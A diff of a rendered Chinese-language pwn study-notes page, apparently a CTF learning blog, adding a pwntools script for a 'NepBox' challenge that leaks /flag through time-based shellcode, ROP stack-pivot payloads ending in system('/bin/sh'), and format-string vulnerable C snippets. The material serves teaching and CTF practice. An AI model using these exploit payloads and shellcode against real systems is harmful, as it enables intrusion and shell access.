+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span> <span class="c1"># 用于时间盲注</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./NepBox&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">base</span><span class="o">=</span><span class="mh">0xdead000</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* open(file=&#39;/flag&#39;, oflag=0, mode=0) */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* push b&#39;/flag</span><span class="se">\x00</span><span class="s1">&#39; */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x101010101010101
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x101010101010101 ^ 0x67616c662f /* &#39;/flag&#39; */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor [rsp], rax /* 异或后恢复为/flag */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi, rsp 
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor edx, edx /* 0 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi, esi /* 0 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* call open() */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push SYS_open /* 2 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* call read(3, 0xdead200, 0x30) */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor eax, eax /* SYS_read 0 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 3
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0x30
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov esi, 0x1010101 /* 0x1010101 ^ 0xcebd301 = 233492992 == 0xdead200 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi, 0xcebd301
+</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">/* 
+</span></span></span><span class="line"><span class="cl"><span class="s1">   stdout=1
+</span></span></span><span class="line"><span class="cl"><span class="s1">   for(int bytes=0;bytes&lt;=0x30;bytes++){ iLoop
+</span></span></span><span class="line"><span class="cl"><span class="s1">       for(int bits=0;bits&lt;=0x7;bits++){ jLoop
+</span></span></span><span class="line"><span class="cl"><span class="s1">             write(stdout,0xdead200+bits+bytes*8,0x1);
+</span></span></span><span class="line"><span class="cl"><span class="s1">       }
+</span></span></span><span class="line"><span class="cl"><span class="s1">   }
+</span></span></span><span class="line"><span class="cl"><span class="s1">*/
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r13,0             /* 偏移量——当前第几个字节:bytes */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r14,0xdead200     /* 基址   */
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">iLoop: /* 外层循环 遍历每个字节 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r15,0 /* 当前字节第几位: bits */
+</span></span></span><span class="line"><span class="cl"><span class="s1">jLoop: /* 内层循环 遍历每个位 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    lea rax,[r13+r14] /* rax内容置为r13+r14地址 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov ax,[rax] /* rax中地址指向的内容: 16位 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rcx,r15 /* rcx 当前位 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    shr ax,cl /* 右移将最低位设置为要读取的位 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    and ax,1 /* &amp; 0x00000001 取最低位的值 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    test ax,ax /* 检查当前位是 0 还是 1 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    jz zero
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">one: /* 进行基于时间的盲注，使得该位为1的时候时间为大于0秒 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r8,0x200000000 /* 不同机器需要变更该延时时间 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">sleep:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r8,1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    jnz sleep /* 延时操作 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">zero:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* write(fd=1, buf=0xdead200+[r13], n=0x1) */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0x1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov esi, 0x1010101 /* 233492992 == 0xdead200 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi, 0xcebd301
+</span></span></span><span class="line"><span class="cl"><span class="s1">    add rsi,r13
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* call write() */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push SYS_write /* 1 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">jLoopEnd:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    add r15,1 /* 
+</span></span></span><span class="line"><span class="cl"><span class="s1">    cmp r15,7
+</span></span></span><span class="line"><span class="cl"><span class="s1">    jbe jLoop
+</span></span></span><span class="line"><span class="cl"><span class="s1">iLoopEnd:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    add r13,1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    cmp r13,0x30
+</span></span></span><span class="line"><span class="cl"><span class="s1">    jbe iLoop
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="ow">or</span> <span class="n">flag</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;}&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">now</span><span class="o">=</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">interval</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">now</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">interval</span><span class="p">:</span> <span class="c1"># 当时间差为 1 时</span>
+</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">|=</span><span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span><span class="p">)</span> <span class="c1"># 在第 i 位上产生一个 1 加入到 s 中, 8 次构成一个字节</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="rop">ROP</h2>
 <p><strong>Return Oriented Programming——返回导向编程：适用于NX 开启情况</strong></p>
 <p>amd64：构造覆盖栈</p>
 <div class="table-wrapper"><table>
@@ -3971,7 +4798,18 @@
 <li>新栈中提前构建好ROP链，即可完成利用</li>
 </ol>
 </blockquote>
-<p><strong>原理示意</strong></p>
+<p><strong>漏洞点</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span> <span class="c1">// buf [rbp-0x30]
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 实际read时是向rbp-0x30的位置写
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>原理示意</strong></p>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844664601118.assets"
 	
 	
@@ -3982,16 +4820,10 @@
 	
 	
 ></p>
-<p>有<code>system</code>函数<code>plt</code>，有<code>rop</code>链，得到<code>ebp</code>栈地址，无<code>/bin/sh</code>字符串，需自行输入，有如下漏洞点：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span> <span class="c1">// buf 0x30
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>构造payload，实行<strong>纯栈</strong>上的栈迁移</p>
+<p><strong>纯栈上栈迁移</strong></p>
+<ul>
+<li>有<code>system</code>函数<code>plt</code>，有<code>rop</code>链，得到<code>ebp</code>栈地址，无<code>/bin/sh</code>字符串，需自行输入</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -4002,23 +4834,107 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">ebp_addr</span> <span class="o">-</span> <span class="mh">0x8</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="mh">0x8</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span>           <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>     <span class="o">+</span> \\
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="mh">0x8</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span>           <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>     <span class="o">+</span> \\ <span class="c1"># ebp位置直接作为返回地址</span>
 </span></span><span class="line"><span class="cl">           <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_addr</span><span class="p">)</span>  <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>  <span class="o">+</span> \\
 </span></span><span class="line"><span class="cl">           <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>   <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>    <span class="o">+</span> \\
 </span></span><span class="line"><span class="cl">           <span class="n">p64</span><span class="p">(</span><span class="n">ebp_addr</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret_addr</span><span class="p">)</span> \\
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/img/pwn_note.zh-cn.assets/-172844664601119.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<h3 id="canary绕过">Canary绕过</h3>
+</div><img src="/img/pwn_note.zh-cn.assets/-172844664601119.assets" alt="img" style="zoom: 50%;" />
+<p><strong>bss段上栈迁移</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">30</span><span class="n">ga</span> <span class="mh">0x404000</span> <span class="c1"># bss段: 0x404000-0x405000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x404000</span><span class="p">:</span>	<span class="mh">0x0</span>	<span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x404010</span><span class="p">:</span>	<span class="mh">0x0</span>	<span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x404020</span> <span class="o">&lt;</span><span class="n">stdout</span><span class="nd">@GLIBC_2</span><span class="mf">.2.5</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0x7f74229e4760</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdout_</span><span class="o">&gt;</span>	<span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x404030</span> <span class="o">&lt;</span><span class="n">stdin</span><span class="nd">@GLIBC_2</span><span class="mf">.2.5</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0x7f74229e3a80</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdin_</span><span class="o">&gt;</span>	    <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x404040</span> <span class="o">&lt;</span><span class="n">stderr</span><span class="nd">@GLIBC_2</span><span class="mf">.2.5</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0x7f74229e4680</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">&gt;</span>	<span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x404050</span><span class="p">:</span>	<span class="mh">0x0</span>	<span class="mh">0x0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>bss</code>段上使用偏移<code>0x200</code>后的地址作为伪造栈</li>
+<li>read函数后的使得rbp进入<code>bss</code>段中，接着返回read函数前</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x404200</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#                         伪造rbp          return address</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>由于buf大小0x80，通过read向<code>rbp-0x80=bss_addr-0x80</code>读入payload2</li>
+<li>read返回后的指令为<code>leave;ret;</code>使得rbp变为<code>bss_addr-0x80</code>，rsp将<code>leave_ret_addr</code>pop给rip【ret指令】</li>
+<li>接着执行返回地址<code>leave_ret_addr</code>中的<code>leave;ret;</code>指令，将rbp变为<code>bss_addr+0x600</code>后将顺序执行flat中指令</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">	<span class="n">bss_addr</span> <span class="o">+</span> <span class="mh">0x600</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pop_rdi_ret_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">	<span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">	<span class="n">main_addr</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    						\\
+</span></span><span class="line"><span class="cl">	<span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span> <span class="o">-</span> <span class="mh">0x80</span><span class="p">)</span> 	\\	<span class="c1"># rbp</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret_addr</span><span class="p">)</span> 		<span class="c1"># return address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span> <span class="c1"># 获取puts got表地址从而获取libc基址</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>通过read读入payload3，ret2libc getshell</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bss_addr</span><span class="p">,</span> <span class="c1"># 应该可以任意地址</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi_ret_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi_ret_addr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x600</span> <span class="o">-</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret_addr</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="canary绕过">Canary绕过</h3>
 <ol>
 <li>格式化字符串读取canary的值，canary最后一个值一定是&quot;\x00&quot;，可以覆盖该值来用<code>%s</code>读取，然后栈溢出再覆盖为00</li>
 <li>canary爆破，针对存在fork函数，复制出来的程序内存布局都一样，子进程报错退回父进程，canary不变</li>
@@ -4288,8 +5204,126 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="格式化字符串">格式化字符串</h2>
-<p>格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数</p>
-<p>当格式化字符串数量多于变参数量，出现不可预知情况：</p>
+<ul>
+<li>格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后参数</li>
+<li>当格式化字符串数量多于变参数量，出现不可预知情况</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%#lx %#lx %#lx %#lx %#lx&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 会依次解析后面的寄存器中的内容 0x1 0x2 0x3 0x7f17717e6f10 0x7f177180c040
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>漏洞点</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>  			<span class="c1">// 标准输入读0x100(256)字节数据到buf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>  	<span class="c1">// buf内容以字符串格式打印到标准输出
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50u</span><span class="p">)</span>	<span class="c1">// 将buf的地址开始的0x50字节的内存区域都设置为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x50u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>			<span class="c1">// buf可控，格式化字符串漏洞
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ms&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">format</span><span class="p">);</span>    <span class="c1">//读取一个字符串并动态分配内存
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>语法</strong></p>
+<p>基本格式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">%</span><span class="p">[</span><span class="n">parameter</span><span class="p">][</span><span class="n">flags</span><span class="p">][</span><span class="n">field</span> <span class="n">width</span><span class="p">][.</span><span class="n">precision</span><span class="p">][</span><span class="n">length</span><span class="p">]</span><span class="n">type</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p><strong>parameter</strong></p>
+<ul>
